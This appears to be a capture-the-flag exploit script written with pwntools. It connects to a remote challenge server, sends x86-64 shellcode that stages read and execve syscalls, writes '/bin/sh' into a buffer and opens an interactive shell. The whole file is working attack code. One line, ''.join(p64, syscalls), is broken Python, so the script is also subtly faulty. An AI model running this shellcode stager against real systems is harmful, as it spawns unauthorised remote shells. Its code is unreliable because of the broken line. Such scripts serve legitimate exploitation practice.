from pwn import *

r = remote('shellcodeme.420blaze.in', 4200)

r.sendline(asm('''
	pop rdi
	pop rdx ; 0
	pop rdi
	pop rdi ; 0
	pop rsi ; rsp - 24
	mov dh, 0xf
	syscall
	pop rdi
	pop rsi
	pop rdx
	pop rax
	syscall
	pop rdi
	pop rsi
	pop rdx
	pop rax
	syscall
	'''))
time.sleep(2)

g_buf = 0x602800
syscalls = [
# read
0, g_buf, 256, 0,
# execve
g_buf, g_buf + 8, 0, 0x3b
]

r.send('a' * 24 + ''.join(p64, syscalls))

time.sleep(1)
r.send('/bin/sh\x00' + p64(g_buf) + p64(0))

r.interactive()